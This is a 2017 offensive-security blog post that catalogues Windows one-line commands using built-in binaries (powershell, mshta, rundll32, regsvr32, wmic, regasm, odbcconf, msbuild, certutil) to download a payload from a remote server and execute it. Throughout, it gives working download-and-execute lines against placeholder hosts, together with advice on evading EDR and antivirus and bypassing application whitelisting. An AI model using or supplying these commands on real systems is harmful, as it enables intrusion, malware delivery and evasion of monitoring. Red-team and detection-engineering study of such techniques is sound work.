## [
# Windows oneliners to download remote payload and execute arbitrary code
](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)

In the wake of the recent buzz and trend in using DDE for executing arbitrary command lines and eventually compromising a system, I asked myself « _what are the coolest command lines an attacker could use besides the famous powershell oneliner_ » ?

These command lines need to fulfill the following prerequisites:

- allow for execution of arbitrary code – _because spawning calc.exe is cool, but has its limits huh ?_
- allow for downloading its payload from a remote server – _because your super malware/RAT/agent will probably not fit into a single command line, does it ?_
- be proxy aware – _because which company doesn&#39;t use a web proxy for outgoing traffic nowadays ?_
- make use of as standard and widely deployed Microsoft binaries as possible – _because you want this command line to execute on as much systems as possible_
- be EDR friendly – _oh well, Office spawning cmd.exe is already a bad sign, but what about powershell.exe or cscript.exe downloading stuff from the internet ?_
- work in memory only – _because your final payload might get caught by AV when written on disk_

A lot of awesome work has been done by a lot of people, especially  **@subTee** , regarding application whitelisting bypass, which is eventually what we want: execute arbitrary code abusing Microsoft built-in binaries.

Let&#39;s be clear that  **not all command lines will fulfill all of the above points**. Especially the « _do not write the payload on disk_ » one, because most of the time the downloaded file will end-up in a local cache.

When it comes to downloading a payload from a remote server, it basically boils down to 3 options:

1. either the command itself accepts an HTTP URL as one of its arguments
2. the command accepts a UNC path (_pointing to a WebDAV server_)
3. the command can execute a small inline script with a download cradle

Depending on the version of Windows (_7, 10_), the local cache for objects downloaded over HTTP will be the  **IE local cache** , in one the following location:

- **C:\Users\\&lt;username\&gt;\AppData\Local\Microsoft\Windows\Temporary Internet Files\**
- **C:\Users\\&lt;username\&gt;\AppData\Local\Microsoft\Windows\INetCache\IE\\&lt;subdir\&gt;**

On the other hand, files accessed via a UNC path pointing to a WebDAV server will be saved in the  **WebDAV client local cache** :

- **C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\TfsStore\Tfs\_DAV**

When using a UNC path to point to the WebDAV server hosting the payload, keep in mind that it will only work if the WebClient service is started. In case it&#39;s not started, in order to start it even from a low privileged user, simply prepend your command line with « pushd \\webdavserver &amp; popd ».

In all of the following scenarios, I&#39;ll mention which process is seen as performing the network traffic and where the payload is written on disk.

## **Powershell**

Ok, this is by far the most famous one, but also probably the  **most monitored one** ,  **if not blocked**. A well known proxy friendly command line is the following:

powershell -execbypass -c &quot;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(&#39;[http://webserver/payload.ps1](http://webserver/payload.ps1)&#39;)|iex&quot;

Process performing network call:  **powershell.exe**
Payload written on disk:  **NO**  (_at least nowhere I could find using procmon !_)

Of course you could also use its encoded counterpart.

But you can also call the payload directly from a WebDAV server:

powershell -execbypass -f [\\webdavserver\folder\payload.ps1](./../../%5C%5Cwebdavserver%5Cfolder%5Cpayload.ps1)

Process performing network call:  **svchost.exe**
Payload written on disk:  **WebDAV client local cache**

## Cmd

Why make things complicated when you can have _cmd.exe_ executing a batch file ? Especially when that batch file can not only execute a series of commands but also, more importantly, embed  **any file type**  (s_cripting, executable, anything that you can think of !_). Have a look at my _ **Invoke-EmbedInBatch.ps1** _ script (_heavily inspired by @xorrior work_), and see that you can easily drop any binary, dll, script: [https://github.com/Arno0x/PowerShellScripts](https://github.com/Arno0x/PowerShellScripts)
So once you&#39;ve been creative with your payload as a batch file, go for it:

cmd.exe /k\&lt; [\\webdavserver\folder\batchfile.txt](./../../%5C%5Cwebdavserver%5Cfolder%5Cbatchfile.txt)

Process performing network call:  **svchost.exe**
Payload written on disk:  **WebDAV client local cache**

## Cscript/Wscript

Also very common, but the idea here is to download the payload from a remote server in one command line:

cscript //E:jscript [\\webdavserver\folder\payload.txt](./../../%5C%5Cwebdavserver%5Cfolder%5Cpayload.txt)

Process performing network call:  **svchost.exe**
Payload written on disk:  **WebDAV client local cache**

## Mshta

Mshta really is the same family as cscript/wscript but with the added capability of executing an inline script which will download and execute a _scriptlet_ as a payload:

mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:[http://webserver/payload.sct](http://webserver/payload.sct)&quot;&quot;)&quot;))

Process performing network call:  **mshta.exe**
Payload written on disk:  **IE local cache**

You could also do a much simpler trick since mshta accepts a URL as an argument to execute an HTA file:

mshta [http://webserver/payload.hta](http://webserver/payload.hta)

Process performing network call:  **mshta.exe**
Payload written on disk:  **IE local cache**

Eventually, the following also works, with the advantage of hiding mshta.exe downloading stuff:

mshta [\\webdavserver\folder\payload.hta](./../../%5C%5Cwebdavserver%5Cfolder%5Cpayload.hta)

Process performing network call:  **svchost.exe**
Payload written on disk:  **WebDAV client local cache**

## Rundll32

A well known one as well, can be used in different ways. First one is referring to a standard DLL using a UNC path:

rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;o=GetObject(&quot;script:[http://webserver/payload.sct](http://webserver/payload.sct)&quot;);window.close();

Process performing network call:  **rundll32.exe**
Payload written on disk:  **IE local cache**

## Wmic

Discovered by @subTee with @mattifestation, wmic can invoke an XSL (_eXtensible Stylesheet Language_) local or remote file, which may contain some scripting of our choice:

wmic os get /format:&quot;[https://webserver/payload.xsl](https://webserver/payload.xsl)&quot;

Process performing network call:  **wmic.exe**
Payload written on disk:  **IE local cache**

## Regasm/Regsvc

Regasm and Regsvc are one of those fancy application whitelisting bypass techniques discovered by @subTee. You need to create a specific DLL (_can be written in .Net/C#_) that will expose the proper interfaces, and you can then call it over WebDAV:

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u[\\webdavserver\folder\payload.dll](./../../%5C%5Cwebdavserver%5Cfolder%5Cpayload.dll)

Process performing network call:  **svchost.exe**
Payload written on disk:  **WebDAV client local cache**

## Regsvr32

Another one from @subTee. This ones requires a slightly different _scriptlet_ from the mshta one above. First option:

regsvr32 /u/n/s/i:http://webserver/payload.sct scrobj.dll

Process performing network call:  **regsvr32.exe**
Payload written on disk:  **IE local cache**

Second option using UNC/WebDAV:

regsvr32 /u/n/s/i:\\webdavserver\folder\payload.sct scrobj.dll

Process performing network call:  **svchost.exe**
Payload written on disk:  **WebDAV client local cache**

## Odbcconf

This one is close to the regsvr32 one. Also discovered by @subTee, it can execute a DLL exposing a specific function. To be noted is that the DLL file doesn&#39;t need to have the _.dll_ extension. It can be downloaded using UNC/WebDAV:

odbcconf /s/a{regsvr [\\webdavserver\folder\payload\_dll.txt](./../../%5C%5Cwebdavserver%5Cfolder%5Cpayload_dll.txt)}

Process performing network call:  **svchost.exe**
Payload written on disk:  **WebDAV client local cache**

## Msbuild

Let&#39;s keep going with all these .Net framework utilities discovered by @subTee. You can NOT use msbuild.exe using an inline tasks straight from a UNC path (_actually, you can but it gets really messy_), so I turned out with the following trick, using msbuild.exe only. Note that it will require to be called within a shell with ENABLEDELAYEDEXPANSION (_/V option_):

cmd /V/c&quot;set MB=&quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe&quot; &amp; !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml \&gt; payload.xml &amp; !MB! payload.xml&quot;

Process performing network call:  **svchost.exe**
Payload written on disk:  **WebDAV client local cache**

Not sure this one is really useful as is. As we&#39;ll see later, we could use other means of downloading the file locally, and then execute it with msbuild.exe.

## Combining some commands

After all, having the possibility to execute a command line (_from DDE for instance_) doesn&#39;t mean you should restrict yourself to only one command. Commands can be chained to reach an objective.

For instance, the whole payload download part can be done with certutil.exe, again thanks to @subTee for discovering this:

certutil -urlcache -split-f http://webserver/payloadpayload

Now combining some commands in one line, with the InstallUtil.exe executing a specific DLL as a payload:

certutil -urlcache -split-f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.dll &amp; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false/upayload.dll

You could simply deliver an executable:

certutil -urlcache -split-f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.exe &amp; payload.exe

There are probably much other ways of achieving the same result, but these command lines do the job while fulfilling most of prerequisites we set at the beginning of this post !

One may wonder why I do not mention the usage of the _bitsadmin_ utility as a means of downloading a payload. I&#39;ve left this one aside on purpose simply because it&#39;s not proxy aware.

## Payloads source examples

All the command lines previously cited make use of specific payloads:

- Various scriplets (.sct), for mshta, rundll32 or regsvr32
- XSL files for wmic
- HTML Application (.hta)
- MSBuild inline tasks (.xml or .csproj)
- DLL for InstallUtil or Regasm/Regsvc

You can get examples of most payloads from the awesome atomic-red-team repo on Github: [https://github.com/redcanaryco/atomic-red-team](https://github.com/redcanaryco/atomic-red-team) from  **@redcanaryco**.

You can also get all these payloads automatically generated thanks to the GreatSCT project on Github: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

You can also find some other examples on my gist: [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
